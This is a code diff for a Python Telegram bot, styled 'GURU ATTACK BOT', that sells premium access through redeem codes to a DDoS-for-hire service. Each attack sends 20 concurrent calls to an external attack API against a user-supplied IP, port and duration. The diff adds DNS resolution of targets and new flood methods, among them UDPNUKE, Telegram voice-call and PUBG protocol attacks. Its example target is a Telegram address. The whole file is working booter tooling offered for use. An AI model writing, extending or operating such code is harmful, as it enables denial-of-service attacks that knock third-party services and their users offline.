@@ -1,4 +1,4 @@
-# app.py - COMPLETE FIXED VERSION WITH COOLDOWN
+# app.py - COMPLETE FIXED VERSION WITH NEW METHODS
 import os
 import logging
 import asyncio
@@ -21,6 +21,8 @@ from telegram.ext import (
 )
 from pymongo import MongoClient
 from dotenv import load_dotenv
+import socket
+import dns.resolver
 
 load_dotenv()
 
@@ -32,7 +34,7 @@ OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 MAX_CONCURRENT = 20
-ATTACK_COOLDOWN = 60  # Cooldown in seconds
+ATTACK_COOLDOWN = 60
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -94,7 +96,8 @@ class Database:
                     "ban_reason": None,
                     "banned_by": None,
                     "banned_at": None,
-                    "last_attack_time": None  # Track last attack time for cooldown
+                    "last_attack_time": None,
+                    "redeem_date": None  # Track when code was redeemed
                 }},
                 upsert=True
             )
@@ -109,7 +112,8 @@ class Database:
                     "plan_expiry": None,
                     "has_used_code": False,
                     "is_banned": False,
-                    "last_attack_time": None
+                    "last_attack_time": None,
+                    "redeem_date": None
                 }
                 return True
             return False
@@ -126,15 +130,23 @@ class Database:
         
         plan = user.get("plan", "free")
         expiry = user.get("plan_expiry")
+        redeem_date = user.get("redeem_date")
         
-        # Check if expiry is a string and convert to datetime
+        # Handle string expiry
         if expiry and isinstance(expiry, str):
             try:
                 expiry = datetime.fromisoformat(expiry)
             except:
                 expiry = None
         
-        # Check if expired
+        # Handle string redeem_date
+        if redeem_date and isinstance(redeem_date, str):
+            try:
+                redeem_date = datetime.fromisoformat(redeem_date)
+            except:
+                redeem_date = None
+        
+        # Check if expired - ONLY if expiry exists
         if expiry and isinstance(expiry, datetime):
             if expiry < datetime.now():
                 plan = "free"
@@ -145,11 +157,10 @@ class Database:
     
     def update_user_plan(self, user_id, plan, expiry):
         if not self.memory_mode:
-            # Convert datetime to string for MongoDB if needed
-            expiry_str = expiry.isoformat() if expiry and isinstance(expiry, datetime) else expiry
+            expiry_str = expiry.isoformat() if expiry and isinstance(expiry, datetime) else None
             result = self.users.update_one(
                 {"user_id": user_id},
-                {"$set": {"plan": plan, "plan_expiry": expiry_str if expiry_str else None}}
+                {"$set": {"plan": plan, "plan_expiry": expiry_str}}
             )
             return result.modified_count > 0
         else:
@@ -196,14 +207,12 @@ class Database:
                 "added_by": added_by,
                 "added_at": datetime.now()
             })
-            # Give admin premium access (LIFETIME)
             self.update_user_plan(user_id, "premium", None)
             return True
         else:
             if user_id in self.admins:
                 return False
             self.admins[user_id] = {"user_id": user_id, "level": level}
-            # Give admin premium access
             if user_id in self.users:
                 self.users[user_id]["plan"] = "premium"
                 self.users[user_id]["plan_expiry"] = None
@@ -308,16 +317,20 @@ class Database:
                     {"code": code},
                     {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                 )
-                # Update user plan
+                # Calculate expiry
                 expiry = datetime.now() + timedelta(days=code_data['access_days'])
                 expiry_str = expiry.isoformat()
+                redeem_date_str = datetime.now().isoformat()
+                
+                # Update user plan with proper expiry
                 self.users.update_one(
                     {"user_id": user_id},
                     {"$set": {
                         "plan": "premium",
                         "plan_expiry": expiry_str,
                         "has_used_code": True,
-                        "code_used": code
+                        "code_used": code,
+                        "redeem_date": redeem_date_str
                     }}
                 )
                 return code_data
@@ -331,6 +344,7 @@ class Database:
                     self.users[user_id]["plan_expiry"] = expiry
                     self.users[user_id]["has_used_code"] = True
                     self.users[user_id]["code_used"] = code
+                    self.users[user_id]["redeem_date"] = datetime.now()
                 return code_data
         return None
     
@@ -371,7 +385,6 @@ class Database:
         else:
             self.logs.append(log)
         
-        # Update last attack time for cooldown
         self.update_last_attack_time(user_id)
         
         user = self.get_user(user_id)
@@ -397,7 +410,6 @@ db = Database(MONGO_URI)
 
 # ===== INITIALIZE OWNER =====
 def init_owner():
-    """Ensure owner exists in database"""
     owner = db.get_user(OWNER_ID)
     if not owner:
         db.add_user(OWNER_ID, "owner", "Owner")
@@ -405,7 +417,6 @@ def init_owner():
     if not db.is_admin(OWNER_ID):
         db.add_admin(OWNER_ID, "owner", "owner", OWNER_ID)
     
-    # Ensure owner has premium (LIFETIME)
     plan, expiry = db.get_user_plan(OWNER_ID)
     if plan != "premium":
         db.update_user_plan(OWNER_ID, "premium", None)
@@ -420,16 +431,14 @@ class AttackManager:
         self.lock = threading.Lock()
         self.total_attacks = 0
         self.concurrent_busy = 0
-        self.global_attack_running = False  # Track if any attack is running
-        self.current_attacker = None  # Track who is attacking
+        self.global_attack_running = False
+        self.current_attacker = None
     
     def can_start_attack(self, user_id):
         with self.lock:
-            # Check if any attack is already running globally
             if self.global_attack_running:
                 return False, f"❌ Another attack is already running!\nPlease wait for it to finish."
             
-            # Check user's cooldown
             last_attack = db.get_last_attack_time(user_id)
             if last_attack:
                 if isinstance(last_attack, str):
@@ -529,9 +538,35 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
+# ===== DNS RESOLVER =====
+async def resolve_dns(target):
+    """Resolve domain to IP address"""
+    try:
+        # Check if it's already an IP
+        try:
+            socket.inet_aton(target)
+            return target
+        except socket.error:
+            pass
+        
+        # Resolve DNS
+        try:
+            answers = dns.resolver.resolve(target, 'A')
+            for rdata in answers:
+                return str(rdata)
+        except:
+            # Fallback to socket
+            try:
+                return socket.gethostbyname(target)
+            except:
+                pass
+        return target
+    except Exception as e:
+        logger.error(f"DNS resolution failed for {target}: {e}")
+        return target
+
 # ===== SEND ALERT TO ADMINS =====
 async def send_attack_alert(attack_info):
-    """Send real-time attack alert to all admins"""
     try:
         admins = db.get_admins()
         user = db.get_user(attack_info['user_id'])
@@ -571,15 +606,21 @@ async def send_api_attack(target, port, duration, attack_num, method="udp"):
     # Map method names to API method names
     method_map = {
         "udp": "udp",
-        "udpbig": "udpbig", 
-        "telegram": "telegram"
+        "udpbig": "udpbig",
+        "udpnuke": "udpnuke",
+        "telegram": "telegram",
+        "telegram-vc": "telegram-vc",
+        "pubg": "pubg"
     }
     
     api_method = method_map.get(method.lower(), "udp")
     
+    # Resolve DNS for target
+    resolved_target = await resolve_dns(target)
+    
     params = {
         "key": API_KEY,
-        "host": target,
+        "host": resolved_target,
         "port": port,
         "time": duration,
         "method": api_method
@@ -605,6 +646,7 @@ async def send_api_attack(target, port, duration, attack_num, method="udp"):
                         "success": True,
                         "attack_num": attack_num,
                         "method": api_method,
+                        "target": resolved_target,
                         "status": response.status,
                         "elapsed": f"{elapsed:.2f}s"
                     }
@@ -613,6 +655,7 @@ async def send_api_attack(target, port, duration, attack_num, method="udp"):
                         "success": False,
                         "attack_num": attack_num,
                         "method": api_method,
+                        "target": resolved_target,
                         "status": response.status,
                         "elapsed": f"{elapsed:.2f}s"
                     }
@@ -623,19 +666,22 @@ async def send_api_attack(target, port, duration, attack_num, method="udp"):
             "success": False,
             "attack_num": attack_num,
             "method": api_method,
+            "target": resolved_target,
             "error": str(e)
         }
 
 # ===== 20 CONCURRENT ATTACKS WITH LIVE UPDATES =====
 async def send_20_concurrent_attacks(target, port, duration, user_id, context, method="udp"):
-    """Launch 20 concurrent API attacks with live time updates"""
     logger.info(f"🚀 Launching 20 concurrent {method} attacks on {target}:{port}")
     
-    # Create status message for user
+    # Resolve DNS for display
+    resolved_target = await resolve_dns(target)
+    
     status_msg = await context.bot.send_message(
         chat_id=user_id,
         text=f"🔥 *ATTACK RUNNING*\n\n"
-             f"🎯 Target: `{target}:{port}`\n"
+             f"🎯 Target: `{target}` → `{resolved_target}`\n"
+             f"🔌 Port: `{port}`\n"
              f"⏱️ Duration: `{duration}s`\n"
              f"📡 Method: `{method.upper()}`\n"
              f"⚡ Attacks: `20 CONCURRENT`\n"
@@ -644,27 +690,21 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context, m
         parse_mode='Markdown'
     )
     
-    # Start attacks
     tasks = []
     for i in range(1, 21):
         task = send_api_attack(target, port, duration, i, method)
         tasks.append(task)
     
-    # Update timer every 5 seconds
     timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port, method))
-    
-    # Wait for attacks to complete
     results = await asyncio.gather(*tasks)
-    
-    # Stop timer
     timer_task.cancel()
     
     success_count = sum(1 for r in results if r.get('success', False))
     
-    # Final message
     final_text = (
         f"✅ *20x {method.upper()} ATTACK COMPLETE!*\n\n"
-        f"🎯 Target: `{target}:{port}`\n"
+        f"🎯 Target: `{target}` → `{resolved_target}`\n"
+        f"🔌 Port: `{port}`\n"
         f"⏱️ Duration: `{duration}s`\n"
         f"📡 Method: `{method.upper()}`\n"
         f"🎯 Attacks: `{success_count}/20 SUCCESSFUL`\n"
@@ -679,16 +719,19 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context, m
         "successful": success_count,
         "results": results,
         "target": target,
+        "resolved_target": resolved_target,
         "port": port,
         "duration": duration,
         "method": method
     }
 
 async def update_timer(status_msg, duration, target, port, method="udp"):
-    """Update the timer every 5 seconds"""
     try:
         start_time = time.time()
         last_update = 0
+        
+        # Resolve DNS once for display
+        resolved_target = await resolve_dns(target)
         
         while True:
             elapsed = time.time() - start_time
@@ -697,13 +740,13 @@ async def update_timer(status_msg, duration, target, port, method="udp"):
             if remaining <= 0:
                 break
             
-            # Update every 5 seconds
             if int(elapsed) % 5 == 0 and int(elapsed) != last_update:
                 last_update = int(elapsed)
                 try:
                     await status_msg.edit_text(
                         f"🔥 *ATTACK RUNNING*\n\n"
-                        f"🎯 Target: `{target}:{port}`\n"
+                        f"🎯 Target: `{target}` → `{resolved_target}`\n"
+                        f"🔌 Port: `{port}`\n"
                         f"⏱️ Duration: `{duration}s`\n"
                         f"📡 Method: `{method.upper()}`\n"
                         f"⚡ Attacks: `20 CONCURRENT`\n"
@@ -726,26 +769,17 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
     
-    # Clear any user data
     context.user_data.clear()
-    
-    # Add user to database
     db.add_user(user_id, user.username, user.first_name)
     
-    # Check if user has premium
     plan, expiry = db.get_user_plan(user_id)
-    
-    # Check if user is admin
     is_admin = db.is_admin(user_id)
     
-    # DEBUG: Log the user's plan
     logger.info(f"User {user_id} - Plan: {plan}, Expiry: {expiry}, Is Admin: {is_admin}")
     
-    # ALL users can access the bot
     stats = attack_manager.get_stats()
     total_attacks = db.get_user_stats(user_id)
     
-    # Show plan status
     if plan == "premium":
         if expiry:
             days_left = max(0, (expiry - datetime.now()).days)
@@ -757,12 +791,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     first_name = user.first_name or "User"
     
-    # Check if attack is running
     attack_status = ""
     if stats['is_running']:
         attack_status = f"\n⚠️ *Attack in progress!*\nPlease wait..."
     
-    # Check cooldown
     cooldown_status = ""
     last_attack = db.get_last_attack_time(user_id)
     if last_attack:
@@ -787,25 +819,20 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack to start attacking!'}"
     )
     
-    # Build keyboard based on plan
     keyboard = []
     if not db.is_banned(user_id):
         if plan == "premium" or is_admin:
             keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
-            # Add extra methods button
             keyboard.append([InlineKeyboardButton("📡 EXTRA METHODS", callback_data="extra_methods")])
         keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
     
-    # Admin buttons
     if is_admin:
         keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
         keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
     
-    # Owner buttons
     if db.is_owner_or_pseudo(user_id):
         keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
     
-    # Info button for non-admins
     if not is_admin:
         keyboard.append([InlineKeyboardButton("👤 MY INFO", callback_data="info")])
     
@@ -845,23 +872,26 @@ async def extra_methods_callback(update: Update, context: ContextTypes.DEFAULT_T
         await query.edit_message_text("❌ You are banned!")
         return
     
-    # Check if attack is already running
     can_start, msg = attack_manager.can_start_attack(user_id)
     if not can_start:
         await query.edit_message_text(msg, parse_mode='Markdown')
         return
     
     keyboard = [
-        [InlineKeyboardButton("📡 UDPBIG", callback_data="method_udpbig")],
-        [InlineKeyboardButton("📡 TELEGRAM", callback_data="method_telegram")],
+        [InlineKeyboardButton("💥 UDPNUKE", callback_data="method_udpnuke")],
+        [InlineKeyboardButton("💥 UDP-BIG", callback_data="method_udpbig")],
+        [InlineKeyboardButton("💥 Telegram-VC", callback_data="method_telegram-vc")],
+        [InlineKeyboardButton("💥 PUBG", callback_data="method_pubg")],
         [InlineKeyboardButton("🔙 BACK", callback_data="back")]
     ]
     
     await query.edit_message_text(
         "📡 *EXTRA ATTACK METHODS*\n\n"
         "Select a method:\n"
-        "• UDPBIG - Large UDP packet flood\n"
-        "• TELEGRAM - Telegram protocol attack\n\n"
+        "• UDPNUKE - Powerful UDP flood\n"
+        "• UDP-BIG - Large UDP packet flood\n"
+        "• Telegram-VC - Telegram voice call attack\n"
+        "• PUBG - PUBG protocol attack\n\n"
         "⚡ All methods use 20 concurrent attacks!\n"
         f"⏳ Cooldown: {ATTACK_COOLDOWN}s between attacks",
         reply_markup=InlineKeyboardMarkup(keyboard),
@@ -898,19 +928,19 @@ async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("❌ You are banned!")
         return
     
-    # Check if attack is already running
     can_start, msg = attack_manager.can_start_attack(user_id)
     if not can_start:
         await query.edit_message_text(msg, parse_mode='Markdown')
         return
     
     method = query.data.replace('method_', '')
+    method_display = method.upper()
     
     await query.edit_message_text(
-        f"💥 *ATTACK ({method.upper()})*\n\n"
+        f"💥 *ATTACK ({method_display})*\n\n"
         "Send: `IP PORT TIME`\n"
         f"Example: `91.108.17.41 32001 60`\n\n"
-        f"📡 Method: `{method.upper()}`\n"
+        f"📡 Method: `{method_display}`\n"
         "⚡ 20 concurrent attacks!\n"
         "⏱️ Time: 60-300 seconds\n"
         f"⏳ Cooldown: {ATTACK_COOLDOWN}s after attack\n"
@@ -924,7 +954,6 @@ async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
-    # Check if user has premium OR is admin
     plan, expiry = db.get_user_plan(user_id)
     is_admin = db.is_admin(user_id)
     
@@ -953,7 +982,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ You are banned!")
         return
     
-    # Check cooldown
     last_attack = db.get_last_attack_time(user_id)
     if last_attack:
         if isinstance(last_attack, str):
@@ -1005,17 +1033,14 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
         
-        # Run attacks with live updates - default UDP
         result = await send_20_concurrent_attacks(target, port, duration, user_id, context, "udp")
         
-        # Log attack
         attack_info = db.log_attack(
             user_id, target, port, duration, "udp",
             "success" if result.get('success') else "failed",
             str(result)
         )
         
-        # Send real-time alert to admins
         await send_attack_alert(attack_info)
         
         attack_manager.stop_attack(attack_id)
@@ -1058,7 +1083,6 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("❌ You are banned!")
         return
     
-    # Check cooldown
     last_attack = db.get_last_attack_time(user_id)
     if last_attack:
         if isinstance(last_attack, str):
@@ -1078,7 +1102,6 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
                 return
     
-    # Check if attack is already running
     can_start, msg = attack_manager.can_start_attack(user_id)
     if not can_start:
         await query.edit_message_text(msg, parse_mode='Markdown')
@@ -1169,7 +1192,6 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         attack_manager.stop_attack(attack_id)
         attack_manager.cleanup()
         
-        # Show cooldown message
         await update.message.reply_text(
             f"✅ *Attack Complete!*\n\n"
             f"⏳ Next attack available in {ATTACK_COOLDOWN} seconds.",
@@ -1212,7 +1234,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "📌 Features:\n"
                 "• Full access\n"
                 "• 20x UDP Concurrent\n"
-                "• UDP, UDPBIG, TELEGRAM methods\n"
+                "• UDP, UDPNUKE, UDP-BIG, Telegram-VC, PUBG\n"
                 f"• {ATTACK_COOLDOWN}s cooldown between attacks\n"
                 "• Unlimited attacks"
             )
@@ -1224,7 +1246,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "📌 Features:\n"
                 "• Full access\n"
                 "• 20x UDP Concurrent\n"
-                "• UDP, UDPBIG, TELEGRAM methods\n"
+                "• UDP, UDPNUKE, UDP-BIG, Telegram-VC, PUBG\n"
                 f"• {ATTACK_COOLDOWN}s cooldown between attacks\n"
                 "• Unlimited attacks"
             )
@@ -1254,7 +1276,6 @@ async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             plan_display = "PREMIUM (Lifetime)"
     
-    # Get cooldown info
     cooldown_info = ""
     last_attack = db.get_last_attack_time(user_id)
     if last_attack:
@@ -1500,7 +1521,6 @@ async def owner_banned_users(update: Update, context: ContextTypes.DEFAULT_TYPE)
     )
 
 async def owner_list_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """List all users with their plan and expiry"""
     query = update.callback_query
     await query.answer()
     
@@ -1518,7 +1538,6 @@ async def owner_list_users_callback(update: Update, context: ContextTypes.DEFAUL
         expiry = user.get('plan_expiry')
         
         if expiry:
-            # Handle both string and datetime
             if isinstance(expiry, str):
                 try:
                     expiry = datetime.fromisoformat(expiry)
@@ -1528,7 +1547,7 @@ async def owner_list_users_callback(update: Update, context: ContextTypes.DEFAUL
                 days_left = max(0, (expiry - datetime.now()).days)
                 expiry_text = f"{days_left}d left"
             else:
-                expiry_text = "Expired" if expiry else "No plan"
+                expiry_text = "Expired"
         else:
             expiry_text = "Lifetime" if plan == "PREMIUM" else "No plan"
         
@@ -1615,14 +1634,12 @@ async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data['awaiting_promote'] = False
             return
         
-        # Check if user exists
         user = db.get_user(user_id)
         if not user:
             await update.message.reply_text(f"❌ User `{user_id}` not found in database. They need to start the bot first.", parse_mode='Markdown')
             context.user_data['awaiting_promote'] = False
             return
         
-        # Check if already admin
         if db.is_admin(user_id):
             await update.message.reply_text(f"❌ User `{user_id}` is already an admin!", parse_mode='Markdown')
             context.user_data['awaiting_promote'] = False
@@ -1630,7 +1647,6 @@ async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         username = user.get('username', 'Unknown')
         
-        # Add as admin
         if db.add_admin(user_id, username, level, update.effective_user.id):
             await update.message.reply_text(
                 f"✅ *ADMIN PROMOTED!*\n\n"
@@ -1658,11 +1674,9 @@ async def owner_demote_callback(update: Update, context: ContextTypes.DEFAULT_TY
         admin_id = admin['user_id']
         level = admin.get('level', 'admin')
         
-        # Owner cannot demote pseudo_owner (both have same power)
         if level == "pseudo_owner":
             continue
         
-        # Skip if admin is owner
         if admin_id == OWNER_ID:
             continue
         
@@ -1686,12 +1700,10 @@ async def process_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     user_id = int(query.data.split('_')[1])
     
-    # Check if trying to demote owner
     if user_id == OWNER_ID:
         await query.edit_message_text("❌ Cannot demote the main owner!")
         return
     
-    # Check if trying to demote pseudo_owner (they have same power as owner)
     admin_level = db.get_admin_level(user_id)
     if admin_level == "pseudo_owner":
         await query.edit_message_text("❌ Cannot demote Pseudo_Owner! They have the same power as Owner.")
@@ -1739,7 +1751,6 @@ async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data['awaiting_ban'] = False
             return
         
-        # Check if user is pseudo_owner (same power as owner)
         admin_level = db.get_admin_level(user_id)
         if admin_level == "pseudo_owner":
             await update.message.reply_text("❌ Cannot ban Pseudo_Owner! They have the same power as Owner.")
@@ -1836,7 +1847,6 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     code = args[0].upper()
     
-    # Check if user already used a code and plan is still active
     user = db.get_user(user_id)
     if user and user.get('has_used_code'):
         plan, expiry = db.get_user_plan(user_id)
@@ -1870,9 +1880,8 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
         
-        # Verify the user was updated
         verify = db.get_user(user_id)
-        logger.info(f"User {user_id} after redeem - Plan: {verify.get('plan') if verify else 'None'}")
+        logger.info(f"User {user_id} after redeem - Plan: {verify.get('plan') if verify else 'None'}, Expiry: {verify.get('plan_expiry') if verify else 'None'}")
         
     else:
         await update.message.reply_text(
@@ -1896,7 +1905,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👥 Users: {len(users)}\n"
         f"⚡ Attack Status: {attack_status}\n"
         f"⏳ Cooldown: {ATTACK_COOLDOWN}s\n"
-        f"🎯 Methods: UDP, UDPBIG, TELEGRAM\n"
+        f"🎯 Methods: UDP, UDPNUKE, UDP-BIG, Telegram-VC, PUBG\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE\n\n"
         f"📌 /attack IP PORT TIME",
@@ -1947,8 +1956,6 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ===== MESSAGE ROUTER =====
 async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Route messages based on user state"""
-    # Check what state the user is in
     if context.user_data.get('awaiting_attack'):
         await process_attack(update, context)
     elif context.user_data.get('awaiting_promote'):
@@ -1957,9 +1964,6 @@ async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await process_ban(update, context)
     elif context.user_data.get('awaiting_unban'):
         await process_unban(update, context)
-    else:
-        # If no state, ignore - commands are handled separately
-        pass
 
 # ===== RUN BOT =====
 application = None
@@ -2009,7 +2013,7 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(owner_banned_users, pattern="^owner_banned_users$"))
     app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
     
-    # Single message router - processes all non-command text messages
+    # Single message router
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
     
     loop.run_until_complete(app.initialize())
@@ -2023,7 +2027,8 @@ if __name__ == "__main__":
     print("=" * 50)
     print("👑 GURU ATTACK BOT")
     print("⚡ 20x UDP CONCURRENT")
-    print("📡 METHODS: UDP, UDPBIG, TELEGRAM")
+    print("📡 METHODS: UDP, UDPNUKE, UDP-BIG, Telegram-VC, PUBG")
+    print("📌 DNS Resolution Enabled")
     print("📌 API-ONLY - NO FALLBACK")
     print("📌 One attack at a time")
     print(f"⏳ Cooldown: {ATTACK_COOLDOWN}s between attacks")
